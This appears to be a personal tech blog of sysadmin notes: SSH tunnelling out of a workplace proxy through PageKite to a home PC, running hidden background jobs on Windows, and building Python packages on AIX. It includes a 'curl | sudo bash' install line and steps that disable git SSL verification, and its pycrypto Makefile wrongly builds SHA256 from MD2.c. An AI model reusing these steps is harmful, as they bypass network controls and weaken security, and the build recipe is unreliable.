        <h1 id="Step"><a href="#Step" class="headerlink" title="Step"></a>Step</h1><h2 id="At-home"><a href="#At-home" class="headerlink" title="At home"></a>At home</h2><ul>
<li>Install cygwin and openssh package in my home’s PC</li>
<li>Install pagekite and run following command as a scheduled job<br><code>python.exe pagekite.py 22 ssh:YOU.pagekite.me</code></li>
</ul>
<h2 id="At-workstation"><a href="#At-workstation" class="headerlink" title="At workstation"></a>At workstation</h2><ul>
<li>Use putty to login YOU.pagekite.me:22 through http proxy **YOU.pagekite.me:443</strong></li>
<li>Create dynamic port forwarding -D1080 in localhost</li>
<li>In putty: Connection -&gt; Seconds between keepalives should be larger than 0(such as 10)</li>
<li>Setup firefox to use socks proxy localhost:1080</li>
</ul>
<h2 id="Another-method-Using-Squid"><a href="#Another-method-Using-Squid" class="headerlink" title="Another method(Using Squid)"></a>Another method(Using Squid)</h2><ul>
<li>at home: install squid</li>
<li>at workstation: using putty to create local port forwarding: **-L3128:localhost:3128</strong></li>
<li>Setup firefox to use http proxy localhost:3128</li>
</ul>
<h2 id="PS-Proxy-tools"><a href="#PS-Proxy-tools" class="headerlink" title="PS: Proxy tools"></a>PS: Proxy tools</h2><p>connect or netcat or <a target="_blank" rel="noopener" href="http://www.agroman.net/corkscrew/">corkscrew</a> or nc <a target="_blank" rel="noopener" href="http://www.proxycap.com/">proxycap</a> or <a target="_blank" rel="noopener" href="http://www.nocrew.org/software/httptunnel.html">httptunnel</a> <a target="_blank" rel="noopener" href="https://www.stunnel.org/docs.html">stunnel</a></p>
<h2 id="Reverse-Proxy"><a href="#Reverse-Proxy" class="headerlink" title="Reverse Proxy"></a>Reverse Proxy</h2><p><a target="_blank" rel="noopener" href="http://pagekite.net/">pagekite</a><br><a target="_blank" rel="noopener" href="http://progrium.com/localtunnel/#readme">localtunnel</a><br><a target="_blank" rel="noopener" href="https://github.com/proxylocal/proxylocal-gem">proxylocal</a></p>
<h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p><strong>vnc loopback connections are not enabled</strong><br>Solved:</p>
<ul>
<li>enable <strong>Allow loopback connections</strong></li>
<li>uncheck the <strong>Use password</strong><br>Ref:<br><a target="_blank" rel="noopener" href="http://diddy.boot-land.net/ssh/files/vnc.htm">Tunnelling VNC over SSH</a><br><a target="_blank" rel="noopener" href="http://support.jumpdesktop.com/entries/227821-VNC-Server-Error-message-Loopback-connections-are-disabled-">VNC: Server Error message “Loopback connections are disabled”</a></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://pagekite.net/wiki/Howto/SshOverPageKite/">ssh pagekite</a><br><a target="_blank" rel="noopener" href="https://pagekite.net/wiki/Howto/Windows/SSHAndTunnels/">putty pagekite</a><br><a target="_blank" rel="noopener" href="http://blog.changyy.org/2009/02/windows-squid-proxy-server-windows-xp_12.html">安裝 Squid Proxy Server @ Windows XP</a></p>
<h3 id="setup-dynamic-port-forwarding"><a href="#setup-dynamic-port-forwarding" class="headerlink" title="setup dynamic port forwarding"></a>setup dynamic port forwarding</h3><p><a target="_blank" rel="noopener" href="https://www.linode.com/wiki/index.php/SSH_Dynamic_Port_Forwarding">SSH Dynamic Port Forwarding</a><br><a target="_blank" rel="noopener" href="http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts">Proxies_and_Jump_Hosts</a></p>
<h3 id="Troubleshoot"><a href="#Troubleshoot" class="headerlink" title="Troubleshoot"></a>Troubleshoot</h3><p><a target="_blank" rel="noopener" href="http://glandium.org/blog/?p=223">SSH using a SOCKS or HTTP proxy</a><br><a target="_blank" rel="noopener" href="http://danielthat.blogspot.hk/2012/10/ssh-putty-session-network-time-out.html">Network error: Software caused connection abort</a><br><a target="_blank" rel="noopener" href="http://superuser.com/questions/454210/how-can-i-use-ssh-with-a-socks-5-proxy">How can I use SSH with a SOCKS 5 proxy</a></p>
<h3 id="Others-must-read"><a href="#Others-must-read" class="headerlink" title="Others(must read)"></a>Others(must read)</h3><p><a target="_blank" rel="noopener" href="http://superuser.com/questions/657977/ssh-as-socks-proxy-through-multiple-hosts-with-http-proxy-involved">SSH as socks proxy through multiple hosts (with http proxy involved)</a><br><a target="_blank" rel="noopener" href="http://superuser.com/questions/332850/ssh-as-socks-proxy-through-multiple-hosts">SSH as socks proxy through multiple hosts</a><br><a target="_blank" rel="noopener" href="http://daniel.haxx.se/docs/sshproxy.html">SSH Through or Over Proxy</a><br><a target="_blank" rel="noopener" href="https://calomel.org/firefox_ssh_proxy.html">Proxy Firefox through a SSH tunnel</a><br><a target="_blank" rel="noopener" href="http://unix.stackexchange.com/questions/97142/whats-the-difference-between-ssh-and-squid-when-using-them-as-proxies">What’s the difference between SSH and Squid when using them as proxies</a><br><a target="_blank" rel="noopener" href="http://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/">SSH Tunneling Explained</a><br><a target="_blank" rel="noopener" href="http://pagekite.net/wiki/Floss/PySocksipyChain/">PySocksipyChain</a><br><a target="_blank" rel="noopener" href="http://etutorials.org/Networking/network+security+hacks/Chapter+6.+Secure+Tunnels/Hack+76+Encrypt+and+Tunnel+Traffic+with+SSL/">Secure+Tunnels&#x2F;Hack+76+Encrypt+and+Tunnel+Traffic+with+SSL</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Run-a-program-as-windows-service-or-background-job" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-17T05:50:39.000Z"><a href="/2014/01/17/Run-a-program-as-windows-service-or-background-job/">2014-01-17</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/17/Run-a-program-as-windows-service-or-background-job/">Run a program as windows service or background job</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="nssm"><a href="#nssm" class="headerlink" title="nssm"></a>nssm</h1><p>Download nssm from <a target="_blank" rel="noopener" href="http://nssm.cc/download">http://nssm.cc/download</a> and follow its usage to install custom program as service.</p>
<h1 id="instsrv"><a href="#instsrv" class="headerlink" title="instsrv"></a>instsrv</h1><ul>
<li>instsrv myProgram “c:\Program Files\Windows Resource Kits\Tools\srvany.exe”</li>
<li>install_service.reg<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\myProgram\Parameters]</span><br><span class="line">&quot;AppDirectory&quot;=&quot;d:\\bin\\myProgram&quot;</span><br><span class="line">&quot;Application&quot;=&quot;D:\\bin\\myProgram\\myProgram.exe&quot;</span><br><span class="line">&quot;AppParameters&quot;=&quot;-d -f d:\\MyWorkDir\\myProgram.ini&quot;</span><br></pre></td></tr></table></figure></li>
<li>sc config myProgram depend&#x3D; Tcpip</li>
<li><code>net start myProgram</code> or <code>sc start myProgram</code></li>
</ul>
<h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Run&#123;</span><br><span class="line">        public static void main(String[] args) throws InterruptedException, IOException &#123;</span><br><span class="line">                  Process pr = Runtime.getRuntime().exec(&quot;D:\\bin\\myProgram\\myProgram.exe -d -f   d:\\MyWorkDir\\myProgram.ini&quot;);</span><br><span class="line">                  pr.waitFor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    javaw -cp . Run</span><br></pre></td></tr></table></figure>

<h1 id="wscript"><a href="#wscript" class="headerlink" title="wscript"></a>wscript</h1><p>run.vbs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell = WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">obj = WshShell.Run(&quot;plink.exe -load remotes_server -N&quot;, 0)</span><br><span class="line">set WshShell = Nothing</span><br></pre></td></tr></table></figure>

<p>wscript run.vbs</p>
<h1 id="at"><a href="#at" class="headerlink" title="at"></a>at</h1><p>if the session is closed such as remote desktop(mstsc), above program will be shutdown. But schedule job has no this problem <code>at 17:50 wscript run.vbs</code> then delete this scheduled job</p>
<h1 id="run-nohup-in-cygwin"><a href="#run-nohup-in-cygwin" class="headerlink" title="run nohup in cygwin"></a>run nohup in cygwin</h1><p><code>nohup wscript run.vbs 2>&1 &</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-SSL-certificate-problem-using-git-in-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-14T06:25:52.000Z"><a href="/2014/01/14/SSL-certificate-problem-using-git-in-AIX/">2014-01-14</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/14/SSL-certificate-problem-using-git-in-AIX/">SSL certificate problem using git in AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>After installed git in AIX, when run <code>git clone</code> found that SSL certificate problem: unable to get local issuer certificate<br>Solution as below collected from google</p>
<h1 id="No-ssl-verify"><a href="#No-ssl-verify" class="headerlink" title="No ssl verify"></a>No ssl verify</h1><ul>
<li><code>export GIT_SSL_NO_VERIFY=true</code> ( <code>unset GIT_SSL_NO_VERIFY</code>)</li>
<li><code>git config http.sslVerify false</code> ( <code>git config --unset http.sslVerify</code>)</li>
<li><code>curl http://curl.haxx.se/ca/cacert.pem -o /var/ssl/cacert.pem</code> (not work, but no &#x2F;etc&#x2F;ssl or &#x2F;etc&#x2F;openssl folder in AIX)</li>
</ul>
<h1 id="SSL-verify"><a href="#SSL-verify" class="headerlink" title="SSL verify"></a>SSL verify</h1><ul>
<li>.git&#x2F;config<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line">    sslCAInfo=/var/ssl/certs/cacert.pem</span><br></pre></td></tr></table></figure></li>
<li><code>git config --system (or --global or --local) http.sslcainfo /var/ssl/certs/cacert.pem</code></li>
</ul>
<p><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewallrhttp://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewall">http://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewallrhttp://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewall</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-ways-of-make-process-to-background-job" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-09T05:56:21.000Z"><a href="/2014/01/09/ways-of-make-process-to-background-job/">2014-01-09</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/09/ways-of-make-process-to-background-job/">ways of making process run in background</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>zdaemon</li>
<li>nohup 2&gt;&amp;1 &amp;</li>
<li>nodejs forever supervisor nodemon</li>
<li>bg&#x2F;fg</li>
<li>tmux&#x2F;screen</li>
<li>ctrl + z</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://ridingpython.blogspot.hk/2011/08/turning-your-python-script-into-linux.html">http://ridingpython.blogspot.hk/2011/08/turning-your-python-script-into-linux.html</a><br><a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Nohup">http://en.wikipedia.org/wiki/Nohup</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-安装wssh,-zdaemon,pagekite等" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-08T02:41:46.000Z"><a href="/2014/01/08/%E5%AE%89%E8%A3%85wssh,-zdaemon,pagekite%E7%AD%89/">2014-01-08</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/08/%E5%AE%89%E8%A3%85wssh,-zdaemon,pagekite%E7%AD%89/">安装wssh, zdaemon,pagekite等</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>安装wssh遇到许多问题和有趣的东西，记录如下：</p>
<ul>
<li>要安装wssh，需要先装 <a target="_blank" rel="noopener" href="http://my.oschina.net/l1z2g9/blog/189309">gevent</a>和 <a target="_blank" rel="noopener" href="http://my.oschina.net/l1z2g9/blog/190780">pyCrypto</a>，其余用 <code>sudo pip install flask paramiko werkzeug jinja2 ecdsa gevent-websocket</code>等</li>
<li>从<a target="_blank" rel="noopener" href="https://github.com/aluzzardi/wssh.git%E4%B8%8B%E8%BD%BDwssh">https://github.com/aluzzardi/wssh.git下载wssh</a> <code>python setup.py install</code> 运行sudo wsshd, 如果发现缺少包，就用pip install</li>
<li>fix问题, 用浏览器打开<a target="_blank" rel="noopener" href="http://ip:5000/">http://ip:5000</a></li>
<li>change <code>from geventwebsocket import WebSocketHandler</code> to <code>from geventwebsocket.handler import WebSocketHandler</code> in file EGG-INFO&#x2F;scripts&#x2F;wsshd</li>
<li>change <code>raw.github.com</code> to <code>rawgithub.com</code> in file wssh&#x2F;templates&#x2F;index.html</li>
<li>运行命令sudo wssh也可以连接</li>
<li>安装zdaemon， <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install zdaemon</span><br><span class="line">zdaemon -p wsshd start</span><br></pre></td></tr></table></figure></li>
<li>安装PageKite<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://pagekite.net/pk/ |sudo bash</span><br><span class="line">pagekite.py --signup</span><br><span class="line">pagekite.py 5000 mypi.pagekite.me</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://github.com/amitsaha/raspi-guide/blob/master/doc/install.rst">https://github.com/amitsaha/raspi-guide/blob/master/doc/install.rst</a><br><a target="_blank" rel="noopener" href="http://echorand.me/2012/10/13/web-based-ssh-access-to-your-raspberry-pi/">http://echorand.me/2012/10/13/web-based-ssh-access-to-your-raspberry-pi/</a><br><a target="_blank" rel="noopener" href="http://www.vpsee.com/2013/06/invoke-a-linux-shell-with-ssh-account-from-browser/">http://www.vpsee.com/2013/06/invoke-a-linux-shell-with-ssh-account-from-browser/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Build-pycrypto-in-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-06T07:48:15.000Z"><a href="/2014/01/06/Build-pycrypto-in-AIX/">2014-01-06</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/06/Build-pycrypto-in-AIX/">Build pycrypto in AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>Download pycrypto-2.6.1 from <a target="_blank" rel="noopener" href="https://www.dlitz.net/software/pycrypto/">https://www.dlitz.net/software/pycrypto/</a> </p>
</li>
<li><p>Unzip pycrypto <code>tar xzvf pycrypto-2.6.1.tar.gz</code></p>
</li>
<li><p>set environment vairable and build source code <code>export ac_cv_func_malloc_0_nonnull=yes</code>(It would throw Error “undefined symbol rpl_malloc”) <code>python setup.py build</code>Refer to <a target="_blank" rel="noopener" href="http://embetek.blogspot.hk/2012/04/iperf-for-arm-cross-compile.html">iperf-for-arm-cross-compile</a> and <a target="_blank" rel="noopener" href="https://forum.openwrt.org/viewtopic.php?pid=4158">openwrt</a></p>
</li>
<li><p>Download dependencies and install them <a target="_blank" rel="noopener" href="http://www.bullfreeware.com/recherche.php">http://www.bullfreeware.com/recherche.php</a></p>
<ul>
<li>gmp-devel-5.1.3-1.aix6.1.ppc.rpm<br><a target="_blank" rel="noopener" href="http://www.perzl.org/aix/index.php">http://www.perzl.org/aix/index.php</a></li>
<li>libtomcrypt-1.17-1.aix5.1.ppc.rpm</li>
<li>libtomcrypt-devel-1.17-1.aix5.1.ppc.rpm</li>
<li>libtommath-0.42.0-1.aix5.1.ppc.rpm</li>
</ul>
</li>
<li><p>Makefile as below </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">CFLAGS=-pthread -fno-strict-aliasing -fwrapv -Wall -Wstrict-prototypes -fPIC -std=c99 -O3 -fomit-frame-pointer -Isrc/ -I/opt/freeware/include/python2.7 -c</span><br><span class="line">LDFLAGS=-pthread -shared -lpython2.7</span><br><span class="line">OBJ_DIR=build/temp.aix-7.1-2.7/src</span><br><span class="line">SO_DIR=build/lib.aix-7.1-2.7/Crypto</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">    echo &quot;building &#x27;Crypto.PublicKey._fastmath&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/_fastmath.c -o $(OBJ_DIR)/fastmath.o</span><br><span class="line">    $(CC) $(LDFLAGS) -lgmp -lm $(OBJ_DIR)/fastmath.o -o $(SO_DIR)/PublicKey/_fastmath.so  (added -lgmp -lm)</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Hash._MD2&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/MD2.c -o $(OBJ_DIR)/MD2.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/MD2.o -o $(SO_DIR)/Hash/_MD2.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Hash._SHA256&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/MD2.c -o $(OBJ_DIR)/SHA256.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/MD2.o -o $(SO_DIR)/Hash/_SHA256.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Hash._SHA224&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/SHA224.c -o $(OBJ_DIR)/SHA224.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/SHA224.o -o $(SO_DIR)/Hash/_SHA224.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Hash._SHA384&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/SHA384.c -o $(OBJ_DIR)/SHA384.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/SHA384.o -o $(SO_DIR)/Hash/_SHA384.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Hash._SHA512&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/SHA512.c -o $(OBJ_DIR)/SHA512.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/SHA512.o -o $(SO_DIR)/Hash/_SHA512.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Hash._RIPEMD160&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/RIPEMD160.c -o $(OBJ_DIR)/RIPEMD160.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/RIPEMD160.o -o $(SO_DIR)/Hash/_RIPEMD160.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._AES&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/AES.c -o $(OBJ_DIR)/AES.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/AES.o -o $(SO_DIR)/Cipher/_AES.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._ARC2&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/ARC2.c -o $(OBJ_DIR)/ARC2.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/ARC2.o -o $(SO_DIR)/Cipher/_ARC2.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._Blowfish&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/Blowfish.c -o $(OBJ_DIR)/Blowfish.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/Blowfish.o -o $(SO_DIR)/Cipher/_Blowfish.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._CAST&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/CAST.c -o $(OBJ_DIR)/CAST.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/CAST.o -o $(SO_DIR)/Cipher/_CAST.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._DES&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) -I/opt/freeware/include/tomcrypt src/DES.c -o $(OBJ_DIR)/DES.o (added -I/opt/freeware/include/tomcrypt)</span><br><span class="line">    $(CC) $(LDFLAGS) -ltomcrypt $(OBJ_DIR)/DES.o -o $(SO_DIR)/Cipher/_DES.so  (added -ltomcrypt)</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._DES3&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) -I/opt/freeware/include/tomcrypt src/DES3.c -o $(OBJ_DIR)/DES3.o  (added -I/opt/freeware/include/tomcrypt)</span><br><span class="line">    $(CC) $(LDFLAGS) -ltomcrypt $(OBJ_DIR)/DES3.o -o $(SO_DIR)/Cipher/_DES3.so (added -ltomcrypt)</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._ARC4&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/ARC4.c -o $(OBJ_DIR)/ARC4.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/ARC4.o -o $(SO_DIR)/Cipher/_ARC4.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Cipher._XOR&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/XOR.c -o $(OBJ_DIR)/XOR.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/XOR.o -o $(SO_DIR)/Cipher/_XOR.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Util.strxor&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/strxor.c -o $(OBJ_DIR)/strxor.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/strxor.o -o $(SO_DIR)/Util/strxor.so</span><br><span class="line"></span><br><span class="line">    echo &quot;building &#x27;Crypto.Util._counter&#x27; extension&quot;</span><br><span class="line">    $(CC) $(CFLAGS) src/_counter.c -o $(OBJ_DIR)/counter.o</span><br><span class="line">    $(CC) $(LDFLAGS) $(OBJ_DIR)/counter.o -o $(SO_DIR)/Util/_counter.so</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-gevent-in-AIX-with-gcc" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-31T09:55:50.000Z"><a href="/2013/12/31/Install-gevent-in-AIX-with-gcc/">2013-12-31</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/31/Install-gevent-in-AIX-with-gcc/">Install gevent in AIX with gcc</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="greenlet"><a href="#greenlet" class="headerlink" title="greenlet"></a>greenlet</h1><p>Download greenlet-0.4.1.zip from <a target="_blank" rel="noopener" href="https://github.com/python-greenlet/greenlet">https://github.com/python-greenlet/greenlet</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -fno-tree-dominator-opts -I. -I/opt/freeware/include/python2.7 -c greenlet.c -o build/greenlet.o</span><br><span class="line">sudo gcc -shared -lpthreads -lpython2.7 -o build/greenlet.so build/greenlet.o</span><br><span class="line">sudo cp build/greenlet.so /opt/freeware/lib/python2.7/site-packages/</span><br></pre></td></tr></table></figure>

<h1 id="libev"><a href="#libev" class="headerlink" title="libev"></a>libev</h1><p>Download libev-4.15.tar.gz from <a target="_blank" rel="noopener" href="http://dist.schmorp.de/libev/">http://dist.schmorp.de/libev/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/libev</span><br><span class="line">gmake &amp;&amp; sudo gmake install</span><br></pre></td></tr></table></figure>

<h1 id="c-ares"><a href="#c-ares" class="headerlink" title="c-ares"></a>c-ares</h1><p>Download c-ares from <a target="_blank" rel="noopener" href="http://c-ares.haxx.se/">http://c-ares.haxx.se/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/c-ares</span><br><span class="line">gmake &amp;&amp; sudo gmake install</span><br></pre></td></tr></table></figure>
<p>Or just run<br>run <code>configure CONFIG_COMMANDS= CONFIG_FILES=</code></p>
<h1 id="gevent"><a href="#gevent" class="headerlink" title="gevent"></a>gevent</h1><ul>
<li>Download gevent-1.0.tar.gz from <a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/gevent#downloads">https://pypi.python.org/pypi/gevent#downloads</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">mkdir build/gevent</span><br><span class="line">cp gevent/*py build/gevent</span><br></pre></td></tr></table></figure></li>
<li>build core.so <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -fno-tree-dominator-opts -I/opt/freeware/include/python2.7 -I/usr/local/libev/include gevent/gevent.core.c -c -o build/gevent/core.o </span><br><span class="line">gcc -pthread -shared -lpython2.7 -L/usr/local/libev/lib -lev -lm build/gevent/core.o -o build/gevent/core.so ( **-lm should be added** otherwise error throw “ld: 0711-317 ERROR: Undefined symbol: .floor”)</span><br></pre></td></tr></table></figure></li>
